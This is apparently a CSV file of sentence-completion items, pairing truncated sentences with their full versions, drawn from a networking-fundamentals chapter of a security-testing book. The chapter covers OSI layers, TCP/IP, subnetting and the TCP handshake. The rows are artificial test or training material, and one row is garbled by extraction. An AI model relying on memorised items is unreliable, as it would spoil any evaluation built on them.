sentence,answer
"after all , unless you are sitting at the computer you are attacking , which","after all , unless you are sitting at the computer you are attacking , which would be very uncommon , you ’ re going to be interacting with the network"
"in some cases , the different attacks , and cer - tainly","in some cases , the different attacks , and cer - tainly the defenses , will make use of networking technologies and communications protocols"
"to understand how networks function , it may be helpful to","to understand how networks function , it may be helpful to have a conceptual under- standing of how the protocols fit together"
"there is another way of describing these functions , sometimes called","there is another way of describing these functions , sometimes called a model but it ’ s more of an as-built architectural design"
"in this chapter , i ’ ll cover both the","in this chapter , i ’ ll cover both the open systems interconnection ( osi ) model and the tcp/ip architecture"
topologies are generally con- ceptual and can be used as a,topologies are generally con- ceptual and can be used as a way of logically organizing systems to see how they are con-nected
this will start us down the path of talking about,"this will start us down the path of talking about the physical elements of networks , including how they are addressed"
"ultimately , when we are networking systems , we","ultimately , when we are networking systems , we want them to be able to communicate with one another"
this refers back to the models mentioned earlier because the different,this refers back to the models mentioned earlier because the different addresses are ways of communicating with the different functions at different layers
"as we move up the network stacks from the physical components , we ’ ll start talk- ing about the protocols you are perhaps","as we move up the network stacks from the physical components , we ’ ll start talk- ing about the protocols you are perhaps most familiar with : internet protocol ( ip ) , transmission control protocol ( tcp ) , and user datagram protocol ( udp )"
these will be the foundational protocols you will need a solid understanding of for not only testing sys-tems,these will be the foundational protocols you will need a solid understanding of for not only testing sys-tems but also providing guidance as to how different vulnerabilities may be remediated by companies you are working for
"one common approach to providing information technology services in companies , especially if","one common approach to providing information technology services in companies , especially if the services are to external users or customers , is to use service providers"
making use of these service providers and working with organizations that have placed systems and,making use of these service providers and working with organizations that have placed systems and services with them introduces some specific challenges to someone performing security assessments or penetration tests
these addresses are best separated into buckets related to,these addresses are best separated into buckets related to the function-ality provided by the protocol each address belongs to
"the first communications model , from the standpoint of what we ’ ll be talking about but also","the first communications model , from the standpoint of what we ’ ll be talking about but also from the standpoint of history , meaning it essentially came first , is more conceptual than strictly practical"
"these communications models are broken into layers , and","these communications models are broken into layers , and the layers are stacked on top of one another"
"because it shows up as a stack of tiers , you","because it shows up as a stack of tiers , you will often hear them referred to as network stacks or protocol stacks"
one important aspect to consider when it comes to these network stacks,one important aspect to consider when it comes to these network stacks is that the layers are all separate and the functionality is distinct
"when two systems are talking , each has these notional layers , and layer c on the first sys-tem","when two systems are talking , each has these notional layers , and layer c on the first sys-tem can only talk to layer c , not layers b , a , or d , on the second system"
the layer/function that gen-erated this set of headers on the sending side,the layer/function that gen-erated this set of headers on the sending side can only be read by the same layer/function on the receiving side
you know what you should say or do and the,you know what you should say or do and the other side of the communication knows what the response is
"without these protocols , you could greet your acquaintance by sticking your little finger into","without these protocols , you could greet your acquaintance by sticking your little finger into your ear and the other person could remove a shoe and throw it at you"
this would be a protocol mismatch and neither of you would have any idea what,this would be a protocol mismatch and neither of you would have any idea what the appropriate response is because they don ’ t know what the initial communi-cation attempt meant
"as we go through the two communications models , i ’ ll talk about not only","as we go through the two communications models , i ’ ll talk about not only the functions that exist at each layer , but also the protocols that exist at each layer"
"when we ’ re done , you ’ ll have two different , but not dissimilar","when we ’ re done , you ’ ll have two different , but not dissimilar , ways of understanding how protocols commu-nicate across systems and how messages between systems/applications are put together"
"the same applications work over ethernet , for example ,","the same applications work over ethernet , for example , as the ones that travel over sonet or frame relay"
"this works because the functionality of each layer is abstracted , meaning layers can","this works because the functionality of each layer is abstracted , meaning layers can communicate with each other without needing to know the details because the functionality is known"
there are many different protocols for each of the,"there are many different protocols for each of the layers , no matter which model we are talking about"
"open systems interconnection prior to the late 1970s , communications systems","open systems interconnection prior to the late 1970s , communications systems used proprietary protocols , making it harder to conceptualize what was happening"
"in the late 1970s , the international organization for standardization ( iso","in the late 1970s , the international organization for standardization ( iso ) began a process to define a set of standards for communication"
"if all the functions are broken out conceptually , the interface","if all the functions are broken out conceptually , the interface points are clearer and , as such , easier to interact with"
while there were concerns about the complexity of this model and the chance that it was unlikely to,"while there were concerns about the complexity of this model and the chance that it was unlikely to be implemented , it remains a solid model to help refer to boundaries between functions within a network stack"
"when indicating a particular functionality , network professionals may","when indicating a particular functionality , network professionals may make reference to the function by the layer number"
"in talking about the model , we typi- cally start at","in talking about the model , we typi- cally start at the ground floor and work our way up to the penthouse"
2 the seven layers of the osi model application presentation session transport network data link physical since we build messages from the,"2 the seven layers of the osi model application presentation session transport network data link physical since we build messages from the application layer down , we ’ re going to start discuss- ing each of the layers and their roles there and move downward"
"for what it ’ s worth , though , the various mnemonics that","for what it ’ s worth , though , the various mnemonics that are often used to help people remember the different layers start at the bottom"
"for example , one of my students once suggested “ please do","for example , one of my students once suggested “ please do not touch steve ’ s pet alligator ” to help remember the order"
"regardless , if you remember either order and then can remember what","regardless , if you remember either order and then can remember what each of the layers does , you ’ ll be in good shape"
presentation ( layer 6 ) the presentation layer,presentation ( layer 6 ) the presentation layer is responsible for preparing data for the application layer
it makes sure that the data that is handed up to,it makes sure that the data that is handed up to the application is in the right format so it can be consumed
"when systems are communicating , there may be disconnects in formatting between the","when systems are communicating , there may be disconnects in formatting between the two endpoints and the presentation layer makes sure that data is formatted correctly"
"additionally , the joint photographic experts group ( jpeg","additionally , the joint photographic experts group ( jpeg ) format is considered to be at the presentation layer"
session ( layer 5 ) the session layer manages the communication between the endpoints when,session ( layer 5 ) the session layer manages the communication between the endpoints when it comes to maintaining the communication of the applications ( the client or server )
there are components of file sharing that also live at the session,"there are components of file sharing that also live at the session layer , since negotiation of com-munication between the endpoints needs to take place"
the application layer takes care of managing the resources while the session layer takes care,"the application layer takes care of managing the resources while the session layer takes care of making sure that files , as an example , are successfully transmitted and complete"
these protocols use ports for address-ing so receiving,these protocols use ports for address-ing so receiving systems know which application to pass the traffic to
"this is a layer 2 address , identifying the network interface on the","this is a layer 2 address , identifying the network interface on the network so communications can get from one system to another on the local network"
"the address resolution protocol ( arp ) , virtual local area networks (","the address resolution protocol ( arp ) , virtual local area networks ( vlans ) , ethernet , and frame relay are data link layer protocols"
one of the problems with the osi model is that there are not,one of the problems with the osi model is that there are not always good fits when it comes to mapping protocols to the seven layers
"as an example , at which layer does the secure shell ( ssh ) protocol live ? is it the session layer because it ultimately","as an example , at which layer does the secure shell ( ssh ) protocol live ? is it the session layer because it ultimately manages sessions , or is it the presentation layer because it includes encryption mechanisms and negotiates them ? other protocols seem to exist between layers"
"arp , for instance , is said to operate at the data link layer , but it needs","arp , for instance , is said to operate at the data link layer , but it needs to know about the network layer because it provides the bridge between the addressing in those two layers"
"additionally , it ’ s entirely possible your device isn ’ t even doing","additionally , it ’ s entirely possible your device isn ’ t even doing any routing but instead it may be bridging to your provider ’ s net-work"
"over the next few years , it grew far beyond the","over the next few years , it grew far beyond the initial two and then three nodes that were connected in 1968–69"
"as more systems were connected to the network , the people responsible for","as more systems were connected to the network , the people responsible for man-aging the network and developing the protocols used to exchange information learned a lot"
"the initial protocol was the 1822 protocol that defined communications to the interface message processor ( imp ) , which was","the initial protocol was the 1822 protocol that defined communications to the interface message processor ( imp ) , which was a large computer with specialized interfaces acting as a message gateway ( think of it as a very primitive router )"
"by 1983 , after many years of development , the ncp was replaced entirely by a","by 1983 , after many years of development , the ncp was replaced entirely by a suite of protocols now commonly called transmission control protocol ( tcp ) /internet protocol ( ip )"
the way the suite of protocols used within tcp/ip works is slightly,the way the suite of protocols used within tcp/ip works is slightly transmission control protocol/internet protocol ( tcp/ip ) way the osi model is described
"for this reason , the suite is sometimes referred to as a model , but it may also be","for this reason , the suite is sometimes referred to as a model , but it may also be referred to as an architecture , since it ’ s a description of an as-built design rather than something conceptual"
"the tcp/ip architecture is a much simpler design than the osi model , which is an immediate difference","the tcp/ip architecture is a much simpler design than the osi model , which is an immediate difference and a reflection of the as-built nature of the design as compared with the conceptual design of the osi"
since the osi model had to be abstract and flexible in order to accommodate a wide,"since the osi model had to be abstract and flexible in order to accommodate a wide variety of protocols and designs , it was broken out into the seven functional categories described earlier"
"essentially what happens is that the session , presentation , and application layers","essentially what happens is that the session , presentation , and application layers from the osi model are collapsed into the application layer in the tcp/ip model"
"additionally , the physical and data link layers from the osi","additionally , the physical and data link layers from the osi model are collapsed into the link layer in the tcp/ip model"
"anything related to the applica-tion communication , including any session","anything related to the applica-tion communication , including any session management and data formatting , is in the application layer"
"regardless of which model you prefer to think about networking in , you","regardless of which model you prefer to think about networking in , you ’ ll find that protocols don ’ t generally sprawl across multiple layers"
"they are designed to fill the require-ments of a specific function ,","they are designed to fill the require-ments of a specific function , which will land pretty squarely into one of the layers of each model"
"in the rest of the chapter , and fairly commonly in the real world in my experience , when","in the rest of the chapter , and fairly commonly in the real world in my experience , when you see a reference to layers , the reference is to the osi model and not the tcp/ip architecture"
"topologies the way networks are designed also uses conceptual models , as a way","topologies the way networks are designed also uses conceptual models , as a way of taking a rat maze of physical networks and mapping them to a logical representation"
"this is not only about getting a logical map of the network , but also","this is not only about getting a logical map of the network , but also helps to identify how everything is connected since it will help to isolate potential issues"
"some will be found in service provider networks ,","some will be found in service provider networks , while others are more commonly found in local area networks"
"in our case , it ’ s a communication channel (","in our case , it ’ s a communication channel ( a single network cable ) that allows the communication between multiple comput-ers"
the t-connector provides a way to extract the signal from the,the t-connector provides a way to extract the signal from the bus in order to provide connec-tivity to the systems on the network
star network when you see a diagram of a star,"star network when you see a diagram of a star network , it will often look similar to the bus network"
"the difference between the bus and the star network , however","the difference between the bus and the star network , however , is that there is a mediating device between all the devices"
"this may be a hub , if you have a very old network","this may be a hub , if you have a very old network , which is a dumb electrical repeater , or you may have a switch"
"in the case of this diagram , the central line you see ,","in the case of this diagram , the central line you see , which looks like a bus , is really a switch or a hub"
"a switch , which is the most common device in a","a switch , which is the most common device in a star network topology , acts at layer 2 of the osi model"
ring network a ring network is similar to a bus network in the sense that,ring network a ring network is similar to a bus network in the sense that all of the nodes on the network appear to be connected on a contiguous network segment
the reason it ’ s a logical representation is because,"the reason it ’ s a logical representation is because physically , this is not how these networks are wired"
"in a token ring network , systems are wired as though they","in a token ring network , systems are wired as though they are in a star , using multistation access units ( maus )"
"just as when you are sitting around a campfire in an aboriginal tribe , where only the person with the","just as when you are sitting around a campfire in an aboriginal tribe , where only the person with the stick gets to talk , a token ring net-work uses a digital representation of the talking stick called a token"
this will theoretically avoid the problem with collisions except that sometimes the,"this will theoretically avoid the problem with collisions except that sometimes the token gets lost , which means a new token has to get generated"
"after the new token gets generated , it ’ s possible for the old token","after the new token gets generated , it ’ s possible for the old token to suddenly get “ found ” again , meaning there are two tokens on the network"
"in spite of a ring network behaving like a bus network , there","in spite of a ring network behaving like a bus network , there isn ’ t a need for terminators as there is in a bus network"
"to get from one system to another , if they are not","to get from one system to another , if they are not wired together directly , a system has to pass through another system"
"if a system in the middle of the bus network fails ,","if a system in the middle of the bus network fails , there is a potential for the entire network to fail along with it"
the system essentially acts like a terminator by,the system essentially acts like a terminator by not allowing the electrical signal to pass through it
"if a system in a mesh network fails , there","if a system in a mesh network fails , there is probably another pathway to get between one system and another"
"7 mesh network while you can connect systems together in multiple ways in a mesh network , in spite of the","7 mesh network while you can connect systems together in multiple ways in a mesh network , in spite of the orderliness that the circular design of the network shows , a couple of failures can potentially isolate nodes in a mesh network"
"the more pathways to get from one system to another , the","the more pathways to get from one system to another , the less chance failure will be cata-strophic , meaning communication doesn ’ t happen"
you can keep adding connections until every system,you can keep adding connections until every system has connections to every other system on the network
you add the same number of connections as you,"you add the same number of connections as you have existing nodes , so your connections increase nearly exponentially"
"in fact , in order to determine the number of connections you","in fact , in order to determine the number of connections you have , you can use the formula n ( n-1 ) /2"
"every system has a connection to every other system except itself , which is why","every system has a connection to every other system except itself , which is why we multiply the number of systems by one less than the number of systems ( e"
"however , there are circumstances where blending multiple network topologies","however , there are circumstances where blending multiple network topologies is the right way to go about con-necting your network together"
if you have switches capable of 64 network connections but you have 200 users that you need,"if you have switches capable of 64 network connections but you have 200 users that you need to connect to your local network , you would need to add a bus into your network topology"
"then from each switch , you have the traditional star where","then from each switch , you have the traditional star where all the connections come back to the switch they are connected to"
"because we aren ’ t likely going to be working at service providers or telecom-munications providers as we are doing security testing , at least not on the","because we aren ’ t likely going to be working at service providers or telecom-munications providers as we are doing security testing , at least not on the provider side of the network , we aren ’ t going to worry about protocols like frame relay , asynchronous transfer mode , or fiber distributed data interface"
the protocol you will almost exclu-sively run across,the protocol you will almost exclu-sively run across when we are talking about physical networking is ethernet
each layer of the network stack has a different term to,each layer of the network stack has a different term to refer to the chunk of data encap- sulated by that layer
because the mac address is hard-coded into the hardware of the,"because the mac address is hard-coded into the hardware of the interface , it is sometimes referred to as the hardware address"
since it ’ s also the address that is used by a physical,"since it ’ s also the address that is used by a physical piece of hardware , it is sometimes referred to as a physical address"
this is also called the vendor id because it,this is also called the vendor id because it identifies the name of the company that manufactured the inter-face
mac addresses the mac address is represented in hexadecimal values,mac addresses the mac address is represented in hexadecimal values because it ’ s a common way to represent octets
you may also run into this when looking at,you may also run into this when looking at ip addresses and certainly anytime you do a hexadecimal dump
"what this means , though , is that traffic that is in some way addressed to the interface , either directly to","what this means , though , is that traffic that is in some way addressed to the interface , either directly to its address or to the broadcast address for example , will get forwarded up to the operating system from the network interface"
switching is what happens when deci-sions about forwarding,switching is what happens when deci-sions about forwarding messages are made based on the physical address
"because having to perform a lookup of which port to forward a message to takes time , which will","because having to perform a lookup of which port to forward a message to takes time , which will slow down message transmission , it ’ s essential that the lookup be as fast as possi - ble"
this is generally accomplished through the use,this is generally accomplished through the use of something called content-addressable memory ( cam )
"instead of an array of data indexed with numeric values , meaning we look up a value by using something like array","instead of an array of data indexed with numeric values , meaning we look up a value by using something like array [ 5 ] to get the value at index 5 in the array , we use a mac address as the index value"
"what a switch does , which is the value of switching , is make","what a switch does , which is the value of switching , is make determinations about what traffic goes to which port based on the destination mac address"
this improves performance because you can fill the network connection with traffic specific to the system,this improves performance because you can fill the network connection with traffic specific to the system connected to the switch port rather than flooding it with all the other traffic on the network
"when performing security testing , acting like an attacker , it ’","when performing security testing , acting like an attacker , it ’ s more convenient to be able to see more traffic than that"
"one of them , if you have some control over the switch ,","one of them , if you have some control over the switch , is to tell the switch to mirror traffic on one port to another port"
"another way is to fool the switch into sending traffic to you ,","another way is to fool the switch into sending traffic to you , which involves methods of attack that we ’ ll cover in later chapters"
"certainly there are other protocols that exist at the network layer , such as the internet packet exchange (","certainly there are other protocols that exist at the network layer , such as the internet packet exchange ( ipx ) , but as the internet runs on ip and its associated protocols , we ’ ll focus there"
"as each layer is passed through , a set of data is","as each layer is passed through , a set of data is added to the message that is specific to the protocol processing the message"
"you may hear every set of data on the network referred to as a packet ,","you may hear every set of data on the network referred to as a packet , but from a technical standpoint , a message from the ip header down is a packet"
this is an aspect people who work with net - working are often fairly,"this is an aspect people who work with net - working are often fairly familiar with , but it ’ s useful to understand what an address comprises"
"this can be challenging to understand , but there are","this can be challenging to understand , but there are some mathematical tricks that can help , once you know them"
there are also a cou - ple of different ways to render the,"there are also a cou - ple of different ways to render the subnet mask , and you ’ ll often run across both of them"
"it hasn ’ t happened yet , but every modern device and operating sys - tem","it hasn ’ t happened yet , but every modern device and operating sys - tem supports ipv6 , so you will see the ipv6 address on most systems you will interact with"
headers the internet engineering task force ( ietf ) is responsible,headers the internet engineering task force ( ietf ) is responsible for maintaining all of the docu - mentation related to protocols
"when someone , or more commonly a group of people , wants to propose a new protocol or","when someone , or more commonly a group of people , wants to propose a new protocol or an extension to an existing protocol , they write something called a request for comments ( rfc ) document"
the very first rfc was written in 1969 and was related to the host software,the very first rfc was written in 1969 and was related to the host software for the imp that was used to interface a computer sys - tem to the arpanet
"at the time , of course , the ietf didn ’ t exist","at the time , of course , the ietf didn ’ t exist , but using rfcs was still the process for creating specifications and standards"
this is the same set of headers that would be,this is the same set of headers that would be pre-sented in the form of a table in the rfc referenced
the difference between the table form and just looking at the headers in this way,"the difference between the table form and just looking at the headers in this way is that with the table , you can clearly see the size of each header field"
9 ip headers the following are the header fields with their descriptions and,9 ip headers the following are the header fields with their descriptions and sizes : version this field indicates which version of ip is in this packet
"because the header is based on 32-bit words , which is 4 bytes ,","because the header is based on 32-bit words , which is 4 bytes , you can get the number of bytes by mul- tiplying this value by 4"
"in the case of this example , you ’ ll find that the headers","in the case of this example , you ’ ll find that the headers are 20 bytes ( five words ) , which is common for an ip header"
type of service the rfc calls this the type of service ( tos ) field,"type of service the rfc calls this the type of service ( tos ) field , though you ’ ll also see it referred to as the differentiated services field"
this field helps network elements make qual- ity of service,this field helps network elements make qual- ity of service ( qos ) decisions by prioritizing some messages and deprioritizing others
total length this is the total length of the,"total length this is the total length of the message , including the ip header and any subsequent data"
"identification sometimes , there is too much data being sent to fit","identification sometimes , there is too much data being sent to fit into the maximum length allowed based on the size of the length field"
"a message that is self-contained , meaning it didn ’","a message that is self-contained , meaning it didn ’ t require any fragmenting , would have this bit clear"
"fragment offset the fragment offset field , 13 bits","fragment offset the fragment offset field , 13 bits long , indicates where the data in the packet aligns"
time to live the time to live ( ttl ) field indicates how long,time to live the time to live ( ttl ) field indicates how long a message can live on the network before it is considered to be expired
"since the packet may pass through multiple network devices in a second , the initial definition of this field isn ’ t","since the packet may pass through multiple network devices in a second , the initial definition of this field isn ’ t relevant anymore and the ttl really indicates the number of network devices ( routing devices , essentially ) the message can pass through"
bytes you will sometimes see the term octet used and you may be wondering why we use the term,bytes you will sometimes see the term octet used and you may be wondering why we use the term octets instead of bytes since what we are referring to is a value that is 8 bits in length
most networks will do something to block source addresses from these ranges coming into,"most networks will do something to block source addresses from these ranges coming into their space , since they should never be originating from the outside of a network"
"the ranges for these private addresses , meant to be used by","the ranges for these private addresses , meant to be used by any network that doesn ’ t have public ip addresses , are 10"
you may also have noticed that the number of devices that,you may also have noticed that the number of devices that are connecting to the internet is increasing at a nearly exponential rate
the stopgap for this is to use private address,"the stopgap for this is to use private address ranges on the inside of networks , especially home networks"
because it would be very awkward to write an ipv6 in dotted octet form,"because it would be very awkward to write an ipv6 in dotted octet form as we do with ipv4 , addresses in ipv6 are written in a different form"
because an octet can be represented with two hexadeci-mal digits,"because an octet can be represented with two hexadeci-mal digits , you will see ipv6 addresses represented in that way"
"since there are 16 octets in an ipv6 address ,","since there are 16 octets in an ipv6 address , the longest address you will run across will be 32 characters"
"in addition to the address being broken up into byte pairs , like fe80 , you ’","in addition to the address being broken up into byte pairs , like fe80 , you ’ ll notice there is a part of the address that has a colon pair with nothing in between"
a message sent to the anycast address will be delivered,a message sent to the anycast address will be delivered to just one of the hosts in the anycast group
"multicast addresses will look like the other addresses , but they are formatted based on","multicast addresses will look like the other addresses , but they are formatted based on the fact that they are multicast addresses and on the application that is using the address"
one of the reasons it ’ s important is that you may,one of the reasons it ’ s important is that you may need to know what addresses belong to your target based on a subnet
"if you don ’ t get the subnet boundaries correct , there is a chance","if you don ’ t get the subnet boundaries correct , there is a chance that you will start testing against systems that don ’ t belong to your target"
"because of that , we ’ ll spend a little time here","because of that , we ’ ll spend a little time here talking about what subnets are and how to determine the boundaries of subnets"
"in part because of this , a part of the ip","in part because of this , a part of the ip address belongs to the host and part belongs to the network"
this segmentation of the address also helps systems to know what,"this segmentation of the address also helps systems to know what addresses are local , meaning the communications stay on the local network"
the way systems are told what are local networks and what are not,the way systems are told what are local networks and what are not local networks is that a subnet mask is paired with the ip address
"to determine what portion of an ip address belongs to the network ,","to determine what portion of an ip address belongs to the network , you look at the bits that are set to 1 in the subnet mask"
"as a result , subnet masks can have only certain values : 0 , 128","as a result , subnet masks can have only certain values : 0 , 128 , 192 , 224 , 240 , 248 , 252 , 254 , and 255"
this is because every posi-tion is a power of two and,this is because every posi-tion is a power of two and we add on from the most significant bit on the left-hand side
looking at the subnet mask above and applying binary to decimal,"looking at the subnet mask above and applying binary to decimal translation , we can see that the subnet mask is 255"
this is where we need to start applying the ip address,this is where we need to start applying the ip address to the subnet mask in order to get the address range
"i can only vary the last octet , and i am constrained because","i can only vary the last octet , and i am constrained because i can ’ t change the value in the most significant bit position"
"the subnet mask used above translates to /25 , and i","the subnet mask used above translates to /25 , and i would indicate the subnet with the ip address by indicating 172"
let ’ s say you want to know how many addresses,let ’ s say you want to know how many addresses belong to a particular network block and you have the cidr notation
"if you want to know how many hosts , you just divide","if you want to know how many hosts , you just divide by 2 or multiply by 2 for every bit change in the prefix"
"if you go to a /25 , that means you get 128 possible values ( divide","if you go to a /25 , that means you get 128 possible values ( divide by 2 because you added a prefix bit , meaning you lost a host bit )"
"if you go the other direction to a /23 , you double because","if you go the other direction to a /23 , you double because you lost a prefix bit , meaning it got added to the host portion"
"if the fi rst octet is used for the network designation and all others are used for the host values , you would have all the","if the fi rst octet is used for the network designation and all others are used for the host values , you would have all the bit positions in that fi rst byte fi lled up , which means you are using 8 bits , leaving you with a cidr designation of /8"
this leaves the remaining 78 bits ( keep in mind,this leaves the remaining 78 bits ( keep in mind that ipv6 addresses are 128 bits long ) for the host
"where ip is a best-effort proto-col , meaning that a best effort is made to","where ip is a best-effort proto-col , meaning that a best effort is made to get messages from one system to another , tcp is said to have guaranteed delivery"
"instead , what it means is there are mechanisms in the protocol that keep track of all of the messages that","instead , what it means is there are mechanisms in the protocol that keep track of all of the messages that are sent , and if something doesn ’ t get to the other end and acknowledged there , messages will be resent"
where previous addresses are related to the systems to ensure messages get from one system to another,"where previous addresses are related to the systems to ensure messages get from one system to another , at the transport layer , we start to become concerned about getting messages to the application"
"tcp is defi ned in rfc 793 , and it was also written","tcp is defi ned in rfc 793 , and it was also written in 1981 , which means tcp has been around for a very long time"
"if the server is send-ing from the server to the client , the destination","if the server is send-ing from the server to the client , the destination port is the ephemeral port assigned to the application that is communicating with the server"
"using the sequence number , the sender tells","using the sequence number , the sender tells the recipient where in the conversation this message falls"
the reason for this is that the packet capture software shows a,"the reason for this is that the packet capture software shows a 0 and then presents relative sequence numbers , which are easier to follow"
acknowledgment number the acknowledgment number is the opposite,acknowledgment number the acknowledgment number is the opposite side of the con- versation from the sequence number
where the sequence number is set from the sender,"where the sequence number is set from the sender , the acknowledgment number is set from the recipient"
this tells the sender where in the commu- nication stream the recipient is,"this tells the sender where in the commu- nication stream the recipient is , which lets the sender know whether anything has been lost in transmission"
"the syn flag is the synchronize flag , indicating","the syn flag is the synchronize flag , indicating that the sequence number is set and should be recorded"
"the rst flag resets the connec-tion , which may happen","the rst flag resets the connec-tion , which may happen if a message is received that appears to be in error"
window the value in the window field tells the,window the value in the window field tells the recipient how many bytes the sender is willing to accept
"a smaller window size means more acknowledgments are necessary , which","a smaller window size means more acknowledgments are necessary , which may be an indica-tion that the communication channel isn ’ t reliable"
"essentially , the urgent pointer says the data from the current sequence","essentially , the urgent pointer says the data from the current sequence number up until the value in the urgent pointer is urgent data"
if the options leave the header length short of that alignment,"if the options leave the header length short of that alignment , padding bits are necessary to fill the remainder of the header"
the handshake ensures that both sides of the conversation,the handshake ensures that both sides of the conversation are live and active because they are expected to respond
this sets the ack flag and increments the initial sequence,"this sets the ack flag and increments the initial sequence number by one , indicating the first message was received"
"keep in mind that the conversation is two-way , so both","keep in mind that the conversation is two-way , so both sides have to keep track of where they are in the conversation"
each side keeps track of a sequence number for,each side keeps track of a sequence number for their side and an acknowledgment number for the other side
the final message in the handshake is one that just has the ack flag,the final message in the handshake is one that just has the ack flag set and the acknowledgment field increments the sequence number set in the syn/ack message
"if either side were attempting to spoof a conversation , they wouldn ’ t","if either side were attempting to spoof a conversation , they wouldn ’ t receive the messages and , as a result , wouldn ’ t respond correctly"
"since the sequence number maintains the number of bytes that have been sent ,","since the sequence number maintains the number of bytes that have been sent , the acknowledgment number tells the sender whether any data has gone missing in transmission"
"additionally , the sequence and acknowledgment numbers ensure","additionally , the sequence and acknowledgment numbers ensure the correct order of messages at the recipient"
"if messages arrive out of order , the sequence numbers indicate","if messages arrive out of order , the sequence numbers indicate whether messages should be held for a message that got lost"
this is also a part of guaran-teed delivery—making sure that the messages not only,this is also a part of guaran-teed delivery—making sure that the messages not only arrive as expected but also are in the correct order when they get there
messages sent using udp are just put out on the wire with the hope that they will,"messages sent using udp are just put out on the wire with the hope that they will get to the destination because the network protocol , ip , will just take care of everything"
with the lighter weight comes very little overhead from things like,with the lighter weight comes very little overhead from things like establishing connections and making sure that messages get where they are going
it also doesn ’ t much matter which order,it also doesn ’ t much matter which order messages are received in from the standpoint of the protocol
the reason for this is that since there is no,"the reason for this is that since there is no connection , there may never be a response from the server"
a source port is required with tcp because there will always be a,"a source port is required with tcp because there will always be a response , even if it ’ s just used to complete the three-way handshake"
the only place responses to closed ports are mentioned that is relevant,the only place responses to closed ports are mentioned that is relevant is in the rfc for the internet control message protocol ( icmp )
any of those are legiti-mate scenarios in which you wouldn ’,any of those are legiti-mate scenarios in which you wouldn ’ t get a response to a message to a udp port
"one significant reason for that is that with udp , it ’ s","one significant reason for that is that with udp , it ’ s up to the application to do any reorder-ing of messages , as required"
if a datagram ( the pdu for udp ) comes in out,"if a datagram ( the pdu for udp ) comes in out of order with streaming video , the application will just discard it"
"in reality , that word would likely be transmitted all in one mes-sage ,","in reality , that word would likely be transmitted all in one mes-sage , but let ’ s say that each letter sound was transmitted in its own message"
"if you were to receive messages with the sounds l , h , l , o , and then e , what would it sound like to you ? our brains are really","if you were to receive messages with the sounds l , h , l , o , and then e , what would it sound like to you ? our brains are really good at piecing missing data together and constructing something that seems whole , but it could be your brain wouldn ’ t be able to make sense of the word as it sounded"
"even if your brain could understand it , it","even if your brain could understand it , it would sound weird and your overall experience would be bad"
why would messages come in out of order ? after,"why would messages come in out of order ? after all , we have very reliable internet service these days"
"however , the failure occurred while at least one of your messages was in flight ,","however , the failure occurred while at least one of your messages was in flight , and you have no way of knowing the message was just dropped due to a failure"
"even if it ’ s not a failure and messages are dropped , it could be that","even if it ’ s not a failure and messages are dropped , it could be that one message takes one route and a later message takes another route , which happens to be faster"
internet control message protocol the icmp is a special case when it,"internet control message protocol the icmp is a special case when it comes to protocols , in that it doesn ’ t carry user data"
"it does sit on top of ip , because it needs the addressing of ip","it does sit on top of ip , because it needs the addressing of ip , but it is considered to be part of the internet layer as ip is"
"this also makes it a bit of an unusual protocol , because it sort","this also makes it a bit of an unusual protocol , because it sort of sits above the internet layer but isn ’ t a transport layer protocol"
"this consists of the type and code fields , which convey the essential information for icmp","this consists of the type and code fields , which convey the essential information for icmp , a checksum field , and then 4 bytes that are labeled “ rest of header"
"it may have values that refer to echo reply , echo","it may have values that refer to echo reply , echo request , destination unreachable , source quench , or timestamp messages"
"as an example , the destination unreachable type has","as an example , the destination unreachable type has codes that would indicate exactly what the destination is"
"it may indicate that they are unreachable , or it may","it may indicate that they are unreachable , or it may indicate that the message that triggered the icmp message was administratively prohibited"
anyone doing security testing or penetration testing will most commonly run across,anyone doing security testing or penetration testing will most commonly run across icmp messages through the use of icmp echo request and echo reply messages
"when the traceroute completes , the program expects to get an icmp type 3","when the traceroute completes , the program expects to get an icmp type 3 , destination unreachable message , probably with the code 3 , meaning destina-tion port unreachable"
"network architectures we ’ ve talked about topologies , and those","network architectures we ’ ve talked about topologies , and those are helpful to get conceptual , logical representa-tions of your network"
pulling the topology together with data flows and,pulling the topology together with data flows and other network elements will give you a network architecture
"this describes the protocols that are used and where they are used ,","this describes the protocols that are used and where they are used , and you may also get security enclaves as part of a network architecture"
"some systems , especially those that need to be directly facing the internet—meaning that external users will make network connections to those systems","some systems , especially those that need to be directly facing the internet—meaning that external users will make network connections to those systems as a normal course of operation—may be kept separate and protected from systems where users are or even where sensitive data is stored"
"using a logical diagram , you may get the sense that systems are","using a logical diagram , you may get the sense that systems are very close together when , in fact , they may be miles apart"
"because modern network technology can cover all manner of sins , so to speak , you can have","because modern network technology can cover all manner of sins , so to speak , you can have systems that are hundreds of miles apart appearing as though they are on the same physical network segment together"
"these systems would be in the same broadcast domain or collision domain , phrases that","these systems would be in the same broadcast domain or collision domain , phrases that mean the systems can communicate using layer 2 without having to route to other networks"
"they could still be local but on a separate network segment , which","they could still be local but on a separate network segment , which would mean the traffic between those network segments would need to be routed"
virtual local area network ( vlan ) a vlan is a lan,virtual local area network ( vlan ) a vlan is a lan where the isolation at layer 2 is handled by software/firmware rather than physically
this means that some switches can be segmented into separate networks with some systems on,this means that some switches can be segmented into separate networks with some systems on one network segment ( vlan ) and some systems on another network segment ( vlan )
it also helps with logical organization of the net-work so the,it also helps with logical organization of the net-work so the same set of traffic policies can be applied across the entire vlan
"while you can run host-based firewalls , it ’ s far easier to maintain a single network","while you can run host-based firewalls , it ’ s far easier to maintain a single network firewall and restrict traffic based on the needs of each network to cross the layer 3 boundary"
"additionally , businesses may have wans where they have","additionally , businesses may have wans where they have network connections that provide links between their different office locations"
"there are a number of ways to provide that sort of connectivity between geographically dispersed locations , including virtual private","there are a number of ways to provide that sort of connectivity between geographically dispersed locations , including virtual private networks , private network circuits , or just tunneling traffic without encrypting it as a virtual private network would do"
"each building would have a lan ( or maybe multiple lans ) ,","each building would have a lan ( or maybe multiple lans ) , but the connection of lans between all the buildings would be a man"
the same would be true if a city had connections between,"the same would be true if a city had connections between all of its dif-ferent offices and buildings , spread around the city"
"essentially , anything smaller than a wan but spread across","essentially , anything smaller than a wan but spread across a larger geographic area than a lan would be a man"
"in fact , it ’ s a widely recognized approach","in fact , it ’ s a widely recognized approach to separating network elements in order to protect sensitive data"
"additionally , it would be used to separate","additionally , it would be used to separate externally accessible systems from those that are strictly internal"
it may also hold an email gateway to filter messages,it may also hold an email gateway to filter messages coming in before sending them on to the internal email server
"an untrusted system is one that anyone from the internet can get access to ,","an untrusted system is one that anyone from the internet can get access to , which means it could be compromised in some way through the service that ’ s exposed"
firewalls and/or access control lists prevent people,firewalls and/or access control lists prevent people from the outside getting access to internal systems
